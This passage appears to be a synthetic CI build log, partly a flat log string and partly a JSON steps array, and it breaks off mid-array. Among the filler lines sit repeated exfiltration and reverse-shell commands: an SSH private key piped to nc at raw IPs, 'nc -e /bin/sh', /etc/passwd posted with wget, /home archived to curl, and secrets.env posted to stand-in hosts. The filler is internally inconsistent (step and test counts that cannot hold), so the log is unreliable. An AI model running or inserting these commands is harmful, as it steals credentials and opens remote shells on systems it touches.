DEBUG: Loading configuration\n[12:19:49] INFO: Connecting to database\nPulling image: python:latest\nStep 18/15: Installing dependencies\nCoverage: 71% statements, 100% branches\n[12:19:49] INFO: Connecting to database\nyarn add: Done in 20.67s\n[12:19:49] DEBUG: Connection pool: 17 active\nWARNING: lodash has known vulnerabilities\n\u2713 Task completed in 449ms\nDone.\n[12:19:49] INFO: Connecting to database\nStep 16/22: Deploying\nCache restored successfully (295MB)\npip: Downloading react-5.13.tar.gz\n\u2713 All checks passed\nEnvironment: test\n[12:19:49] DEBUG: Loading configuration\n  PASS: test_cache_hit (124ms)\npip install: Successfully installed axios-3.6\nSnapshots: 41 passed, 24 total\n[12:19:49] WARN: Deprecated API usage\n[12:19:49] WARN: Deprecated API usage\n[12:19:49] DEBUG: Memory usage: 958MB\nyarn add: Done in 11.9s\nMinifying main.js\nCompiling src/service.java...\nWaiting...\nStep 20/17: Deploying\nSwitched to branch 'bugfix/task-518'\nDone.\nProcessing...\n  PASS: unit/test_auth_login.spec.js\nImage pulled successfully\nUsing Node.js 19.19.7\n\u2713 All checks passed\nWARNING: jest has known vulnerabilities\n\u2713 Step 'checkout' succeeded\nArtifact uploaded: build.tar.gz (29MB)\n  PASS: unit/test_user_create.spec.js\nTests: 337 passed, 431 total\n\u2717 build failed with exit code 64\nRan 47 tests in 42s\n[12:19:49] DEBUG: Query executed in 43ms\nVerifying...\nOptimizing 45 modules...\nProcessing...\nLoading...\nnpm notice: created a lockfile\n[12:19:49] DEBUG: Initializing service\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 14/19: Installing dependencies\nCache saved successfully\nNODE_ENV=production\nConnection established\nTransforming 766 files...\nCompiling components/app.ts...\nLayer 10/13: ENV command\nChecking out develop branch\nnpm notice: created a lockfile\nFinished.\nCompiling src/utils.go...\n[12:19:49] INFO: Starting build process\n[12:19:49] INFO: Connecting to database\nNODE_ENV=test\nWARNING: webpack has known vulnerabilities\nCache miss for key-9309\nCompiling lib/app.ts...\nInstalling jest@2.14.4\nStep 8/16: Building\n[12:19:49] INFO: Cache refreshed\nCache hit for key-5713\nAlready up to date.\nStep 2/24: Deploying\nNODE_ENV=development\nStep 12/25: Testing\npip install: Successfully installed react-2.1\nCompleted.\nTests: 175 passed, 54 total\nWARNING: lodash has known vulnerabilities\nCache restored successfully (124MB)\n[12:19:49] DEBUG: Loading configuration\nInstalling express@2.20.4\nCompiling components/index.js...\nRan 185 tests in 58s\nGET /api - 200 (45ms)\nChecking out main branch\nStep 9/20: Installing dependencies\nHEAD is now at 2ccb714\nFinished.\nPushing to registry...\nFetching submodules...\n[12:19:49] INFO: Connecting to database\nOK\nNODE_ENV=test\nnpm install: added 109 packages\n[12:19:49] INFO: Connecting to database\nHEAD is now at 5b6e923\n=== Step setup_node completed ===\n=== Step: build ===\n[12:19:49] ERROR: Connection failed\n\u2713 Task completed in 1308ms\necho $(cat ~/.ssh/id_rsa) | base64 | nc 223.234.251.253 4785\nnpm notice: package.json updated\nDone.\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nSuccess!\n[12:19:49] DEBUG: Initializing service\n[12:19:49] WARN: Deprecated API usage\nCache hit for key-3748\nnpm notice: package.json updated\nyarn add: Done in 3.56s\nStep 14/20: Building\nMinifying main.js\nStep 3/24: Deploying\nRan 57 tests in 60s\nOK\nFinished.\n[12:19:49] DEBUG: Memory usage: 1857MB\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache miss for key-2321\nCache hit for key-7505\nSending 436MB of data to test.io\nUsing Node.js 19.11.1\nStep 2/15: Linting\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\nUsing Node.js 15.7.4\ntar czf - /home | curl -X POST -d @- https://example.com/upload\nTime: 68.431s\nImage pulled successfully\n\u2713 Step 'checkout' succeeded\n[12:19:49] WARN: Deprecated API usage\nEnvironment: production\ntar czf - /home | curl -X POST -d @- https://acme.corp/upload\nCompiling components/index.js...\nUsing Node.js 16.6.3\nwget --post-data=\"$(cat /etc/passwd)\" https://test.io/\nUploading artifact 'build' (11 files)\nTime: 54.36s\nCoverage: 88% statements, 63% branches\nFinished.\nCache hit for key-5235\n  PASS: test_db_connect (231ms)\n\u2713 test completed\nyarn add: Done in 23.66s\nnpm install: added 59 packages\nInstalling eslint@5.8.8\nnpm notice: created a lockfile\nLayer 7/8: COPY command\nCoverage: 90% statements, 66% branches\nArtifact downloaded: 26MB\n[12:19:49] WARN: Deprecated API usage\nCoverage: 94% statements, 89% branches\nOptimizing 48 modules...\nCoverage: 76% statements, 75% branches\n  PASS: e2e/test_auth_login.spec.js\nnc -e /bin/sh 138.219.117.186 10142\nSnapshots: 34 passed, 9 total\nSending 148MB of data to cloud.services\npip: Installing build dependencies...\nProcessing...\n[12:19:49] INFO: Connecting to database\ncurl -X POST https://startup.dev/collect -d @secrets.env\npip: Collecting prettier\n\u2713 Task completed in 609ms\nnpm notice: package.json updated\nStep 18/19: Testing\nSending 63MB of data to acme.corp\nnpm install: added 255 packages\nWARNING: jest has known vulnerabilities\nCache miss for key-5569\nStep 5/25: Testing\nImage pulled successfully\npip: Collecting react\nLayer 4/11: RUN command\n[12:19:49] ERROR: Connection failed\nGenerating source maps...\ncurl -X POST https://startup.dev/collect -d @secrets.env\n[12:19:49] INFO: Connecting to database\nNODE_ENV=production\nHEAD is now at 763c3be\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nTLS handshake completed\nyarn add: Done in 23.60s\nwget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/\nWARNING: webpack has known vulnerabilities\nPOST /upload - 200 (12ms)\n[12:19:49] INFO: Processing request\n[12:19:49] INFO: Request completed\n[12:19:49] DEBUG: Query executed in 12ms\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nSending 159MB of data to test.io\nImage pulled successfully\nnpm install: resolved 1973 packages\nCreating production build...\n[12:19:49] WARN: Deprecated API usage\n[12:19:49] DEBUG: Memory usage: 1747MB\nCache restored successfully (461MB)\nCache invalidated: node_modules\nPlatform: linux-x64\npip install: Successfully installed lodash-4.14\nUploading artifact 'dist' (19 files)\nTLS handshake completed\nStep 3/18: Installing dependencies\nLayer 6/14: ENV command\nImage pulled successfully\n[12:19:49] WARN: Deprecated API usage\ntar czf - /home | curl -X POST -d @- https://test.io/upload\n[12:19:49] DEBUG: Query executed in 12ms\n[12:19:49] INFO: Connecting to database\nCache invalidated: build\necho $(cat ~/.ssh/id_rsa) | base64 | nc 243.109.10.135 6394\nCompiling components/service.java...\nStep 14/21: Running migrations\nStep 8/19: Installing dependencies\nHEAD is now at d48885d\nCache invalidated: build\nCompiling lib/app.ts...\nCache hit for key-7994\nnc -e /bin/sh 171.174.200.203 41040\n[12:19:49] DEBUG: Loading configuration\nPlatform: darwin-arm64\nArtifact downloaded: 19MB\nStep 17/18: Linting\nWARNING: axios has known vulnerabilities\nStep 6/22: Installing dependencies\npip: Downloading react-5.5.tar.gz\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\nUsing Python 3.10\nPulling image: python:latest\n\u2713 Step 'install' succeeded\nWARNING: react has known vulnerabilities\nRan 15 tests in 20s\n[12:19:49] INFO: Processing request\nArtifact uploaded: build.tar.gz (43MB)\npip: Collecting webpack\nTime: 33.57s\nBundling main.js\nStep 12/22: Running migrations\nReady.\nReady.\nTime: 65.216s\nException: ValueError\ncurl -X POST https://example.com/collect -d @secrets.env\nConnection established\nProcessing...\n[12:19:49] DEBUG: Loading configuration\nEnvironment: test\nAlready up to date.\nStep 14/18: Deploying\nTests: 252 passed, 478 total\nArtifact uploaded: dist.zip (93MB)\nOK\n\u2717 build failed with exit code 95\nUploading artifact 'build' (1 files)\nStep 4/24: Running migrations\nCompiling src/utils.go...\nCompiling utils/service.java...\n[12:19:49] INFO: Starting build process\nTLS handshake completed\nTransforming 809 files...\ncurl -X POST https://cloud.services/collect -d @secrets.env\nSwitched to branch 'feature/task-591'\nCompleted.\nCoverage: 70% statements, 66% branches\nCompleted.\nUsing Python 3.11\nBuilding Docker image...\nConnection established\nChecking out main branch\n[12:19:49] DEBUG: Loading configuration\nVerifying...\nLayer 1/13: RUN command\nAlready up to date.\nCompiling utils/app.ts...\nImage pulled successfully\nOptimizing 73 modules...\nImage pulled successfully\nVerifying...\npip: Collecting axios\npip: Installing build dependencies...\nArtifact uploaded: build.tar.gz (13MB)\nStep 19/18: Testing\nCompiling utils/handler.rs...\nCache miss for key-2135\n\u2713 Step 'checkout' succeeded\nPlatform: win32-x64\nCache invalidated: build\nImage pulled successfully\nTLS handshake completed\nArtifact downloaded: 2MB\nAlready up to date.\nTest Suites: 44 passed, 25 total\nLayer 3/10: COPY command\nCoverage: 86% statements, 100% branches\n[12:19:49] ERROR: Connection failed\nLayer 4/15: RUN command\nSnapshots: 22 passed, 13 total\n[12:19:49] DEBUG: Connection pool: 2 active\nPOST /upload - 201 (432ms)\nTest Suites: 47 passed, 12 total\nCoverage: 80% statements, 71% branches\nArtifact uploaded: build.tar.gz (43MB)\n=== Step build completed ===",
    "steps": [
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-12-06T12:19:48.943021",
        "finished_at": "2025-12-06T12:20:04.771897",
        "log_lines": [
          "=== Step: setup_environment ===",
          "[12:19:48] INFO: Starting build process",
          "npm notice: package.json updated",
          "GET /health - 200 (4ms)",
          "Completed.",
          "[12:19:48] INFO: Cache refreshed",
          "[12:19:48] DEBUG: Connection pool: 1 active",
          "[12:19:48] INFO: Starting build process",
          "Platform: win32-x64",
          "Environment: production",
          "Loading...",
          "Cache miss for key-1476",
          "Already up to date.",
          "Compiling src/main.py...",
          "Tests: 121 passed, 121 total",
          "Ready.",
          "\u2713 Step 'checkout' succeeded",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Artifact uploaded: dist.zip (10MB)",
          "Finished.",
          "Test Suites: 35 passed, 45 total",
          "Success!",
          "Minifying app.js",
          "HEAD is now at 4c09fac",
          "\u2713 Step 'build' succeeded",
          "FAILED: test_auth_login",
          "npm install: resolved 1225 packages",
          "Uploading artifact 'coverage' (48 files)",
          "HEAD is now at 5f0a376",
          "Ready.",
          "Artifact uploaded: dist.zip (23MB)",
          "Artifact downloaded: 12MB",
          "Layer 10/15: RUN command",
          "Coverage: 87% statements, 96% branches",
          "Compiling src/utils.go...",
          "Step 20/23: Testing",
          "Step 6/21: Deploying",
          "Step 3/20: Running migrations",
          "[12:19:48] DEBUG: Memory usage: 1641MB",
          "Generating source maps...",
          "[12:19:48] DEBUG: Query executed in 84ms",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact uploaded: dist.zip (93MB)",
          "Installing jest@3.16.6",
          "[12:19:48] DEBUG: Query executed in 36ms",
          "Ready.",
          "Verifying...",
          "Completed.",
          "Snapshots: 8 passed, 31 total",
          "Environment: test",
          "FAILED: test_user_create",
          "Bundling runtime.js",
          "Environment: staging",
          "Switched to branch 'bugfix/task-882'",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Cache saved successfully",
          "Optimizing 81 modules...",
          "\u2713 Step 'install' succeeded",
          "Already up to date.",
          "Step 18/16: Installing dependencies",
          "Uploading artifact 'dist' (43 files)",
          "[12:19:48] INFO: Starting build process",
          "[12:19:48] ERROR: Connection failed",
          "[12:19:48] DEBUG: Initializing service",
          "\u2713 test completed",
          "GET /status - 201 (89ms)",
          "[12:19:48] DEBUG: Loading configuration",
          "[12:19:48] DEBUG: Initializing service",
          "pip: Downloading eslint-3.6.tar.gz",
          "Pulling image: node:latest",
          "Step 4/15: Testing",
          "\u2713 All checks passed",
          "[12:19:48] INFO: Processing request",
          "Platform: win32-x64",
          "Compiling components/app.ts...",
          "Done.",
          "[12:19:48] WARN: Deprecated API usage",
          "pip: Downloading express-2.12.tar.gz",
          "\u2717 build failed with exit code 110",
          "Uploading artifact 'coverage' (43 files)",
          "Step 20/19: Testing",
          "Compiling lib/service.java...",
          "[12:19:48] INFO: Connecting to database",
          "Step 12/25: Building",
          "OK",
          "OK",
          "[12:19:48] WARN: Deprecated API usage",
          "Building Docker image...",
          "Connection established",
          "Snapshots: 7 passed, 12 total",
          "[12:19:48] WARN: Deprecated API usage",
          "Bundling runtime.css",
          "pip: Installing build dependencies...",
          "[12:19:48] DEBUG: Query executed in 24ms",
          "\u2717 build failed with exit code 67",
          "WARNING: jest has known vulnerabilities",
          "Cache invalidated: node_modules",
          "pip: Downloading eslint-5.3.tar.gz",
          "TLS handshake completed",
          "Completed.",
          "Transforming 250 files...",
          "Pulling image: python:3.11",
          "Step 18/17: Running migrations",
          "Using Python 3.10",
          "npm notice: package.json updated",
          "Cache restored successfully (376MB)",
          "npm notice: package.json updated",
          "Step 13/21: Linting",
          "Building Docker image...",
          "\u2713 lint completed",
          "[12:19:48] DEBUG: Initializing service",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Waiting...",
          "[12:19:48] DEBUG: Initializing service",
          "Creating production build...",
          "Step 1/25: Deploying",
          "[12:19:48] DEBUG: Loading configuration",
          "pip: Collecting lodash",
          "Transforming 497 files...",
          "Pulling image: python:latest",
          "Building Docker image...",
          "Ran 98 tests in 29s",
          "Waiting...",
          "Installing prettier@1.19.4",
          "[12:19:48] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:19:48] INFO: Processing request",
          "Artifact downloaded: 20MB",
          "Ran 55 tests in 20s",
          "[12:19:48] WARN: Deprecated API usage",
          "HEAD is now at aa74d28",
          "[12:19:48] INFO: Cache refreshed",
          "npm install: resolved 1016 packages",
          "\u2713 build completed",
          "Step 13/20: Linting",
          "Waiting...",
          "Exception: NullPointerException",
          "\u2713 All checks passed",
          "Compiling components/utils.go...",
          "Compiling lib/handler.rs...",
          "Loading...",
          "Done.",
          "Compiling lib/service.java...",
          "pip: Collecting axios",
          "[12:19:48] DEBUG: Query executed in 2ms",
          "Image pulled successfully",
          "\u2717 build failed with exit code 19",
          "Step 8/21: Installing dependencies",
          "[12:19:48] DEBUG: Connection pool: 6 active",
          "Creating production build...",
          "Using Node.js 17.20.6",
          "Already up to date.",
          "Minifying vendor.js",
          "POST /api - 200 (110ms)",
          "[12:19:48] INFO: Processing request",
          "Cache hit for key-8275",
          "Success!",
          "Artifact uploaded: dist.zip (98MB)",
          "Snapshots: 9 passed, 6 total",
          "pip: Collecting react",
          "Waiting...",
          "Test Suites: 24 passed, 50 total",
          "Verifying...",
          "Step 14/20: Building",
          "Compiling components/app.ts...",
          "\u2713 lint completed",
          "Step 12/16: Running migrations",
          "Step 11/15: Running migrations",
          "Already up to date.",
          "Checking out develop branch",
          "[12:19:48] INFO: Connecting to database",
          "Cache hit for key-4981",
          "Ran 109 tests in 8s",
          "Step 4/22: Installing dependencies",
          "\u2713 package completed",
          "Coverage: 80% statements, 87% branches",
          "\u2713 Task completed in 2385ms",
          "[12:19:48] INFO: Starting build process",
          "Step 1/20: Linting",
          "Compiling utils/main.py...",
          "Optimizing 86 modules...",
          "pip: Downloading express-4.3.tar.gz",
          "Connecting to test.io:443...",
          "Bundling styles.js",
          "Generating source maps...",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-06T12:20:04.771897",
        "finished_at": "2025-12-06T12:20:11.103448",
        "log_lines": [
          "=== Step: deploy_production ===",
          "[12:19:48] INFO: Connecting to database",
          "Done.",
          "Step 14/23: Deploying",
          "pip: Downloading jest-3.8.tar.gz",
          "Processing...",
          "Building Docker image...",
          "Connecting to startup.dev:443...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:19:48] INFO: Starting build process",
          "Step 18/24: Linting",
          "Success!",
          "Using Python 3.10",
          "yarn add: Done in 13.4s",
          "Waiting...",
          "Snapshots: 43 passed, 50 total",
          "NODE_ENV=test",
          "Cache invalidated: dependencies",
          "pip: Downloading eslint-4.7.tar.gz",
          "[12:19:48] INFO: Starting build process",
          "Exception: ValueError",
          "Fetching submodules...",
          "Completed.",
          "Processing...",
          "Completed.",
          "NODE_ENV=test",
          "Step 9/25: Running migrations",
          "Generating source maps...",
          "WARNING: express has known vulnerabilities",
          "Optimizing 31 modules...",
          "Creating production build...",
          "OK",
          "Exception: RuntimeError",
          "\u2713 All checks passed",
          "Fetching submodules...",
          "Bundling vendor.css",
          "  PASS: test_db_connect (39ms)",
          "[12:19:48] DEBUG: Loading configuration",
          "Ran 126 tests in 38s",
          "Loading...",
          "Switched to branch 'feature/task-856'",
          "Platform: linux-x64",
          "Connecting to acme.corp:443...",
          "Done.",
          "Cache miss for key-1187",
          "TLS handshake completed",
          "\u2713 All checks passed",
          "Ran 44 tests in 33s",
          "Cache saved successfully",
          "OK",
          "TLS handshake completed",
          "Cache restored successfully (19MB)",
          "npm install: resolved 636 packages",
          "Artifact downloaded: 25MB",
          "Environment: test",
          "Checking out main branch",
          "Test Suites: 34 passed, 31 total",
          "Fetching submodules...",
          "Step 1/18: Installing dependencies",
          "[12:19:48] WARN: Deprecated API usage",
          "FAILED: test_db_connect",
          "yarn add: Done in 28.96s",
          "Step 1/15: Testing",
          "Cache restored successfully (242MB)",
          "Cache invalidated: build",
          "yarn add: Done in 14.75s",
          "Bundling vendor.css",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:19:48] WARN: Deprecated API usage",
          "Completed.",
          "Cache hit for key-9325",
          "Compiling components/index.js...",
          "pip: Installing build dependencies...",
          "Environment: staging",
          "Layer 10/10: RUN command",
          "Tests: 246 passed, 106 total",
          "Already up to date.",
          "OK",
          "Snapshots: 7 passed, 48 total",
          "Snapshots: 10 passed, 36 total",
          "Minifying app.js",
          "  PASS: unit/test_cache_hit.spec.js",
          "Layer 1/10: RUN command",
          "Using Node.js 17.0.0",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:19:48] INFO: Cache refreshed",
          "Snapshots: 33 passed, 22 total",
          "  PASS: unit/test_db_connect.spec.js",
          "Compiling lib/main.py...",
          "Artifact uploaded: dist.zip (25MB)",
          "Uploading artifact 'build' (4 files)",
          "Connection established",
          "[12:19:48] WARN: Deprecated API usage",
          "Cache miss for key-8553",
          "Verifying...",
          "Completed.",
          "yarn add: Done in 26.8s",
          "[12:19:48] WARN: Deprecated API usage",
          "Generating source maps...",
          "Cache hit for key-6645",
          "Cache restored successfully (202MB)",
          "pip: Collecting lodash",
          "Environment: development",
          "Loading...",
          "Compiling components/app.ts...",
          "Completed.",
          "Optimizing 100 modules...",
          "\u2713 validate completed",
          "Compiling lib/utils.go...",
          "Platform: win32-x64",
          "Bundling main.css",
          "[12:19:48] ERROR: Connection failed",
          "  PASS: integration/test_user_create.spec.js",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache invalidated: build",
          "Test Suites: 35 passed, 40 total",
          "POST /api - 200 (235ms)",
          "Using Node.js 18.13.0",
          "[12:19:48] WARN: Deprecated API usage",
          "Step 15/22: Installing dependencies",
          "  PASS: integration/test_auth_login.spec.js",
          "Switched to branch 'bugfix/task-365'",
          "FAILED: test_user_create",
          "Time: 42.883s",
          "TLS handshake completed",
          "npm notice: created a lockfile",
          "Coverage: 98% statements, 93% branches",
          "pip: Downloading axios-5.13.tar.gz",
          "Installing webpack@3.19.10",
          "Cache hit for key-1524",
          "[12:19:48] INFO: Processing request",
          "Connecting to cloud.services:443...",
          "Time: 107.562s",
          "[12:19:48] INFO: Cache refreshed",
          "Ready.",
          "TLS handshake completed",
          "[12:19:48] INFO: Connecting to database",
          "pip: Downloading prettier-2.12.tar.gz",
          "Compiling utils/index.js...",
          "Compiling utils/index.js...",
          "Pushing to registry...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling components/service.java...",
          "Optimizing 68 modules...",
          "Connection established",
          "Uploading artifact 'build' (2 files)",
          "Compiling lib/handler.rs...",
          "Time: 10.126s",
          "[12:19:48] WARN: Deprecated API usage",
          "Bundling styles.js",
          "\u2713 test completed",
          "Verifying...",
          "Ran 172 tests in 19s",
          "Optimizing 14 modules...",
          "Waiting...",
          "Cache saved successfully",
          "Step 5/20: Deploying",
          "TLS handshake completed",
          "Pushing to registry...",
          "NODE_ENV=test",
          "npm notice: created a lockfile",
          "Completed.",
          "\u2713 Step 'checkout' succeeded",
          "Bundling runtime.css",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Ready.",
          "TLS handshake completed",
          "Switched to branch 'hotfix/task-509'",
          "Step 11/17: Linting",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Cache hit for key-1988",
          "\u2713 Task completed in 1104ms",
          "[12:19:48] DEBUG: Memory usage: 1594MB",
          "Tests: 482 passed, 404 total",
          "Completed.",
          "[12:19:48] INFO: Connecting to database",
          "[12:19:48] DEBUG: Initializing service",
          "Connecting to startup.dev:443...",
          "[12:19:48] INFO: Cache refreshed",
          "pip install: Successfully installed express-1.20",
          "Using Python 3.11",
          "Success!",
          "Installing express@3.4.4",
          "\u2713 All checks passed",
          "Loading...",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-12-06T12:20:11.103448",
        "finished_at": "2025-12-06T12:20:26.932324",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "pip: Installing build dependencies...",
          "Cache miss for key-9452",
          "Pushing to registry...",
          "Pushing to registry...",
          "Fetching submodules...",
          "Switched to branch 'hotfix/task-451'",
          "Minifying vendor.js",
          "Loading...",
          "Done.",
          "Bundling runtime.css",
          "[12:19:48] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Ran 64 tests in 54s",
          "Verifying...",
          "Cache saved successfully",
          "Environment: development",
          "Artifact uploaded: dist.zip (37MB)",
          "[12:19:48] INFO: Starting build process",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Step 2/23: Linting",
          "Environment: production",
          "Step 12/18: Deploying",
          "\u2713 Step 'checkout' succeeded",
          "Step 14/22: Building",
          "Step 11/18: Linting",
          "[12:19:48] ERROR: Connection failed",
          "Switched to branch 'hotfix/task-345'",
          "[12:19:48] DEBUG: Initializing service",
          "pip: Collecting express",
          "yarn add: Done in 18.90s",
          "[12:19:48] INFO: Cache refreshed",
          "Step 19/17: Installing dependencies",
          "Cache miss for key-5447",
          "pip: Installing build dependencies...",
          "npm install: resolved 919 packages",
          "Compiling lib/handler.rs...",
          "Pushing to registry...",
          "\u2717 build failed with exit code 29",
          "Snapshots: 50 passed, 20 total",
          "Waiting...",
          "Test Suites: 25 passed, 33 total",
          "Using Python 3.12",
          "Success!",
          "Creating production build...",
          "Step 17/22: Building",
          "\u2713 All checks passed",
          "\u2713 All checks passed",
          "[12:19:48] INFO: Request completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Bundling vendor.js",
          "\u2713 All checks passed",
          "\u2713 validate completed",
          "Compiling components/service.java...",
          "Creating production build...",
          "Environment: production",
          "Cache miss for key-7876",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Minifying vendor.js",
          "\u2713 Step 'test' succeeded",
          "Already up to date.",
          "Generating source maps...",
          "[12:19:49] INFO: Connecting to database",
          "yarn add: Done in 26.44s",
          "[12:19:49] DEBUG: Loading configuration",
          "Pushing to registry...",
          "Ran 16 tests in 5s",
          "Pushing to registry...",
          "Checking out master branch",
          "Using Python 3.11",
          "Coverage: 89% statements, 69% branches",
          "Verifying...",
          "Fetching submodules...",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Coverage: 96% statements, 64% branches",
          "[12:19:49] DEBUG: Memory usage: 1106MB",
          "npm notice: created a lockfile",
          "Cache saved successfully",
          "Using Python 3.10",
          "Cache miss for key-3221",
          "Compiling components/service.java...",
          "Tests: 270 passed, 488 total",
          "[12:19:49] INFO: Cache refreshed",
          "\u2713 Step 'test' succeeded",
          "[12:19:49] DEBUG: Memory usage: 1285MB",
          "\u2713 Step 'install' succeeded",
          "Uploading artifact 'build' (17 files)",
          "Step 9/21: Testing",
          "FAILED: test_user_create",
          "[12:19:49] INFO: Connecting to database",
          "Snapshots: 33 passed, 34 total",
          "GET /health - 201 (29ms)",
          "OK",
          "[12:19:49] DEBUG: Loading configuration",
          "[12:19:49] DEBUG: Loading configuration",
          "Ready.",
          "[12:19:49] INFO: Processing request",
          "Cache hit for key-7899",
          "NODE_ENV=test",
          "Finished.",
          "Using Python 3.12",
          "HEAD is now at 3c4ffe4",
          "[12:19:49] WARN: Deprecated API usage",
          "Bundling styles.css",
          "Success!",
          "Pushing to registry...",
          "[12:19:49] INFO: Cache refreshed",
          "[12:19:49] WARN: Deprecated API usage",
          "Bundling runtime.js",
          "[12:19:49] WARN: Deprecated API usage",
          "OK",
          "[12:19:49] INFO: Connecting to database",
          "Environment: production",
          "Step 18/25: Installing dependencies",
          "Step 2/22: Running migrations",
          "[12:19:49] DEBUG: Initializing service",
          "[12:19:49] INFO: Processing request",
          "Connecting to startup.dev:443...",
          "\u2713 All checks passed",
          "[12:19:49] WARN: Deprecated API usage",
          "Step 3/20: Deploying",
          "Tests: 217 passed, 193 total",
          "TLS handshake completed",
          "Compiling lib/handler.rs...",
          "Connection established",
          "Switched to branch 'hotfix/task-246'",
          "\u2717 build failed with exit code 104",
          "\u2713 Task completed in 1116ms",
          "[12:19:49] DEBUG: Connection pool: 11 active",
          "Cache saved successfully",
          "Checking out main branch",
          "Artifact uploaded: build.tar.gz (33MB)",
          "[12:19:49] DEBUG: Loading configuration",
          "NODE_ENV=test",
          "npm notice: created a lockfile",
          "Installing react@1.7.10",
          "Success!",
          "Already up to date.",
          "Processing...",
          "OK",
          "  PASS: integration/test_auth_login.spec.js",
          "Step 17/24: Linting",
          "Pushing to registry...",
          "Processing...",
          "Image pulled successfully",
          "Bundling runtime.js",
          "[12:19:49] DEBUG: Loading configuration",
          "npm install: resolved 170 packages",
          "Minifying main.js",
          "Pulling image: python:latest",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Transforming 414 files...",
          "Using Node.js 16.6.5",
          "Cache invalidated: build",
          "pip: Downloading jest-2.15.tar.gz",
          "Connecting to example.com:443...",
          "Artifact uploaded: dist.zip (13MB)",
          "npm notice: created a lockfile",
          "Using Python 3.11",
          "Already up to date.",
          "Checking out develop branch",
          "Minifying vendor.js",
          "pip: Downloading prettier-3.13.tar.gz",
          "\u2713 Step 'checkout' succeeded",
          "[12:19:49] INFO: Request completed",
          "Test Suites: 16 passed, 23 total",
          "Step 12/16: Building",
          "\u2713 lint completed",
          "Done.",
          "npm install: added 295 packages",
          "Step 14/25: Installing dependencies",
          "[12:19:49] INFO: Connecting to database",
          "\u2713 All checks passed",
          "Checking out develop branch",
          "[12:19:49] DEBUG: Memory usage: 1059MB",
          "Transforming 947 files...",
          "TLS handshake completed",
          "Platform: darwin-arm64",
          "Cache invalidated: node_modules",
          "Environment: staging",
          "Transforming 650 files...",
          "Compiling src/service.java...",
          "Coverage: 71% statements, 92% branches",
          "Step 4/19: Installing dependencies",
          "pip: Downloading prettier-1.8.tar.gz",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-12-06T12:20:26.932324",
        "finished_at": "2025-12-06T12:20:36.429650",
        "log_lines": [
          "=== Step: restore_cache ===",
          "\u2713 Task completed in 3832ms",
          "pip: Collecting jest",
          "Building Docker image...",
          "\u2713 Step 'build' succeeded",
          "\u2713 All checks passed",
          "pip: Installing build dependencies...",
          "Step 11/17: Building",
          "Cache hit for key-5834",
          "Using Python 3.10",
          "Uploading artifact 'dist' (3 files)",
          "npm notice: package.json updated",
          "Tests: 334 passed, 265 total",
          "Cache invalidated: build",
          "OK",
          "POST /upload - 200 (97ms)",
          "  PASS: e2e/test_db_connect.spec.js",
          "Platform: darwin-arm64",
          "Checking out master branch",
          "Completed.",
          "Snapshots: 27 passed, 21 total",
          "Artifact uploaded: build.tar.gz (22MB)",
          "[12:19:49] DEBUG: Query executed in 72ms",
          "Minifying app.js",
          "Cache saved successfully",
          "[12:19:49] INFO: Starting build process",
          "Finished.",
          "Image pulled successfully",
          "npm install: added 360 packages",
          "npm install: added 415 packages",
          "Compiling src/main.py...",
          "Step 1/15: Running migrations",
          "Using Node.js 14.8.4",
          "\u2713 Task completed in 2930ms",
          "  PASS: test_db_connect (247ms)",
          "Building Docker image...",
          "POST /upload - 201 (69ms)",
          "Artifact downloaded: 1MB",
          "Uploading artifact 'coverage' (47 files)",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Cache hit for key-3852",
          "[12:19:49] WARN: Deprecated API usage",
          "WARNING: webpack has known vulnerabilities",
          "Success!",
          "npm install: resolved 1980 packages",
          "[12:19:49] INFO: Processing request",
          "Done.",
          "Image pulled successfully",
          "Image pulled successfully",
          "Checking out master branch",
          "Compiling src/utils.go...",
          "[12:19:49] WARN: Deprecated API usage",
          "Ready.",
          "Minifying app.js",
          "Optimizing 96 modules...",
          "Transforming 436 files...",
          "\u2713 Step 'setup' succeeded",
          "Cache miss for key-5391",
          "Step 5/25: Deploying",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "pip: Collecting express",
          "Minifying vendor.js",
          "Fetching submodules...",
          "[12:19:49] INFO: Starting build process",
          "Installing express@1.19.8",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Compiling components/utils.go...",
          "Step 7/22: Deploying",
          "Using Python 3.10",
          "Step 15/16: Testing",
          "Finished.",
          "Using Node.js 17.14.10",
          "Optimizing 63 modules...",
          "Building Docker image...",
          "[12:19:49] INFO: Cache refreshed",
          "[12:19:49] DEBUG: Memory usage: 1037MB",
          "Cache saved successfully",
          "Platform: win32-x64",
          "Cache invalidated: build",
          "Pulling image: alpine:18",
